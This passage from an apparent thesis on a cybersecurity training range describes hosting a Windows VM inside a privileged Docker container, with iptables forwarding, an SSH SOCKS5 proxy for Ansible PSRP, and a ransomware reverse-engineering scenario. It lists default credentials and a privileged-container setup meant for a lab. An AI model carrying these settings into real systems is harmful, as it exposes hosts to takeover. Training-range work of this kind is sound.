+    \item \textbf{Docker Daemon}, which will handle the final Docker image (\textit{Ubuntu 18.04 Linux}) out of which we will spawn a container. The Docker image's main function is to run a hypervisor on which the Windows VM will be running.
+    \item \textbf{Hypervisor on the Docker Image} (\textit{KVM-QEMU}) which enables the installation and managing of the Windows VM later on.
+    \item \textbf{Windows VM}, the machine, a pre-packaged Windows 10 Vagrant box\footnote{\url{https://app.vagrantup.com/peru/boxes/windows-10-enterprise-x64-eval}}, we will be available through RDP.
+\end{itemize}
+
+The first step is to build the Docker image that will have the hypervisor installed. For this, we need to make sure virtualization (VT-x) is enabled in the BIOS settings, so the Virtual Machine can be launched. Then, in our \textit{Ubuntu 18.04 Linux} image, we first install the \textit{QEMU-KVM} hypervisor package and \textit{Libvirt} which is an API library that manages KVM. Afterward, we map the \texttt{/dev/kvm} and \texttt{/dev/net/tun} devices in the host OS inside the container and the \texttt{/sys/fs/cgroup} directory in the host OS inside the container ensuring read-write permissions on it. Also, we make the container run in privileged mode, meaning it can access almost all resources the host OS can. Another important topic worth mentioning is the installation of Vagrant, necessary to run the Windows VM. We then download the respective \textit{Vagrantfile} which contains instructions on how to build the Vagrant box whose size is about 5.6GB.
+
+Setting up the right \textit{iptables} rules revealed itself a challenge. This is extremely important to ensure access to the RDP port on the Vagrant box from out the container. By default, the Vagrant box configures firewall rules to allow access only from within the hypervisor container, meaning machines external to the hypervisor container do not have access to the Windows Vagrant box. As such, rules that redirect traffic from the base OS to the Vagrant box on RDP are needed. Essentially, the logic followed is depicted in Fig. \ref{fig:vagrant_iptables_rules}.
+
+\begin{figure}[H]
+    \includegraphics[width=13cm]{figures/vagrant_iptables_rules.pdf}
+    \caption{Schema of Vagrant \textit{iptables} Rules.}
+    \label{fig:vagrant_iptables_rules}
+\end{figure}
+
+The inserted \textit{iptables} rules on the hypervisor container concerning NAT and port forwarding from the host OS to the container were:
+
+\begin{itemize}
+    \item Forward new TCP connections on ports 3389 (RDP), 5985 (PSRP HTTP), and 5986 (PSRP HTTPS) destined to the Windows VM.
+    \item Add ``prerouting'' rule that changes destination packet address to the Windows VM on connections reaching ports 3389, 5985, and 5986.
+    \item Add ``postrouting'' rule that changes source packet address to the hypervisor container on connections reaching ports 3389, 5985, and 5986.
+    \item Forward established and related connections from and to the Windows VM.
+    \item Reject every other kind of traffic from and to the Windows machine. Notice the previous rules take precedence over this rule.
+\end{itemize}
+
+These rules are sufficient for establishing RDP and PSRP (PowerShell Remoting Protocol) connections. The former is a protocol for remote desktop access while the latter is a protocol that runs over WinRM, a remote management protocol that uses a SOAP based API for communication between the client and the server. Essentially, PSRP establishes remote sessions with the Windows machine, runs PowerShell commands and scripts on it, and receives the results back.
+
+% Vagrant Box inside Linux with KVM installed (iptables, rdesktop)
+
+The PSRP traffic redirection rules denote how to forward traffic from Ansible instructions destined to Windows machines. After we create the Windows VM, we need to configure it, so we intend to follow the same logic as previously, and use Ansible to remotely configure the Vagrant box. This way, commands issued from the base OS go through the Linux hypervisor container using the above-mentioned \textit{iptables} rules, and is redirected using NAT to reach the final target which is the Windows VM box. This is possible using an SSH connection from the Ansible host machine to the hypervisor container which will then redirect the traffic. Still, there are incompatibilities with these different remote access protocols between Linux and Windows: SSH, and PSRP or WinRM. 
+
+To handle this we use a PSRP Ansible connector that connects to Windows-based machines using the PSRP protocol. We could also have chosen a WinRM Ansible connector, but PSRP offers the possibility to use a SOCKS5 proxy, which is suited for handling connections of Windows hosts sitting behind a bastion, in our case, the hypervisor machine. So, our current setup uses two distinct Ansible connectors: the Docker one that connects to the Linux containers, and the PSRP one that connects to the Windows VM.
+
+On the above paragraph, we mentioned the SOCKS5 proxy which routes traffic back and forth between two distinct actors, acting as a middle man between the two. Packets going through this proxy are not modified nor encrypted, only in cases where traffic is encrypted through the use of an SSH connection, as it currently happens, from the Ansible host to the bastion host. The reason this SOCKS5 proxy is needed is to forward WinRM commands to the bastion host. As mentioned, SSH creates incompatibility issues as it is only suited for remote access commands on Unix-like systems.
+
+A basic outline of the current configuration is shown in Fig. \ref{fig:vagrant_kvm_host}.
+
+\begin{figure}[H]
+    \includegraphics[width=13cm]{figures/vagrant_kvm_setup.pdf}
+    \caption{Ansible Host, Hypervisor Container and Vagrant Box Architecture \cite{vagrant_kvm_host_ref}.}
+    \label{fig:vagrant_kvm_host}
+\end{figure}
+
+The network boundaries included in this setup include:
+
+\begin{itemize}
+    \item \textbf{Ansible Host to the SOCKS Listener:}
+        \begin{itemize}
+            \item The Ansible host forwards data using the the WinRM payload encapsulated in a SOCKS packet.
+            \item A SOCKS5 proxy is setup in the Ansible host.
+        \end{itemize}
+    \item \textbf{SOCKS Listener to the SSH client:}
+        \begin{itemize}
+            \item Data from the SOCKS5 proxy is sent using an internal SSH channel.
+        \end{itemize}
+    \item \textbf{SSH Channel}
+        \begin{itemize}
+            \item All data is encrypted using the SSH protocol.
+        \end{itemize}
+    \item \textbf{SSH Server to the WinRM Listener}
+        \begin{itemize}
+            \item The bastion host, the hypervisor container, acts as the Ansible controller and sends the WinRM traffic to the Windows VM using port 5985 or 5986.
+            \item The WinRM service in the Windows VM sees the bastion host as the source of the communication and has no idea of the SSH and SOCKS implementation behind it.
+        \end{itemize}
+\end{itemize}
+
+The steps for configuring the SSH proxy that exposes the SOCKS5 proxy to channel the WinRM requests through the bastion host are rather simple. The way to go is using SSH multiplexing with \textit{ControlMaster}:
+
+\begin{lstlisting}[caption=SSH Proxy Exposing SOCKS5 Proxy.,numbers=none,label={lst:ssh_proxy_socks5}]
+ssh -o "ControlMaster=auto" -o "ControlPersist=no" -o "ControlPath=~/.ssh/cp/ssh-%r@%h:%p" -CfNq -D 127.0.0.1:1234 kvm
+\end{lstlisting}
+
+What the command in Listing \ref{lst:ssh_proxy_socks5} does is to enable SSH multiplexing which allows reusing an existing SSH connection to establish multiple sessions without needing to re-authenticate every time, saving resources. Without this, every time a command is executed the SSH client must establish a new TCP connection and a new SSH session with the remote host. A SOCKS5 proxy is also configured on port 1234 and establishes a channel with the \textit{kvm} host which is the binding in the SSH configuration file for the hypervisor container, meaning our bastion host. After this is setup, we need to configure which variables are associated with the hypervisor container in the Ansible environment.
+
+\begin{lstlisting}[caption=Ansible Variables For The Hypervisor Container.,numbers=none,label={lst:ssh_proxy_socks5}]
+"ansible_user": "administrator",
+"ansible_password": "vagrant",
+"ansible_connection": "psrp",
+"ansible_psrp_protocol": "http",
+"ansible_psrp_proxy": "socks5h://localhost:1234"
+\end{lstlisting}
+
+In Ansible means, we need the host machine to issue commands to the Windows VM as if there is no bastion host in the middle. For this, we use the \texttt{ansible\_psrp\_proxy} variable that points to the SOCKS5 proxy server that we just specified in Listing \ref{lst:ssh_proxy_socks5}. Any commands sent through it will be redirected to the Windows VM. Regarding the \texttt{socks5h} scheme, it means the DNS resolution is done in the bastion host, in case, the hypervisor container.
+
+\subsubsection{Scenario Construction} \label{sec:validation_ransomware_construction}
+
+The Ransomware scenario is based in the FireEye Flare-On Challenge of the 2016 edition. Essentially, a Ransomware attack employs encryption to hold a victim's information at ransom. The target user or organization's critical data that includes files, databases or entire applications, are encrypted and a ransom is demanded to provide access. 
+
+The Ansible construction of the scenario includes all the configurations presented in Section \ref{sec:validation_windows_vagrant_inside_linux_docker} and some little extras:
+
+\begin{itemize}
+    \item Copy of scenario files.
+    \item \textbf{Tool Installation:}
+    \begin{itemize}
+        \item \textbf{IDA Free Version} - Popular tool that allows users to debug, disassemble and decompile binary files.
+        \item \textbf{x64dbg} - Debugger and disassembler similar to IDA but designed mostly for Windows executables.
+        \item \textbf{Process Explorer} - Provides detailed information on processes, modules, handles, and threads running in Windows.
+        \item \textbf{Process Monitor} - Used for monitoring and capturing real-time system activity, including file system, registry, process, and network-related events on Windows.
+        \item \textbf{PeStudio} - Software analysis tool designed for examining files in the Windows PE (Portable Executable) format.
+    \end{itemize}
+\end{itemize}
+
+All this tools are installed by default in the Windows VM and are, therefore, accessible to the trainee. As mentioned earlier, the VM is accessible through Remote Desktop and the credentials for accessing it are \textit{vagrant:vagrant} or \textit{administrator:administrator}.
+
+\subsubsection{Solution} \label{sec:validation_ransomware_solution}
+
+% Network Structure (No External Network)
+% Ansible (WinRMI Connection, Playbooks, etc)
+% FireEye Scenario
+% Reverse Engineering With Process Monitor, Process Explorer, PeStudio, IDA, x86dbg
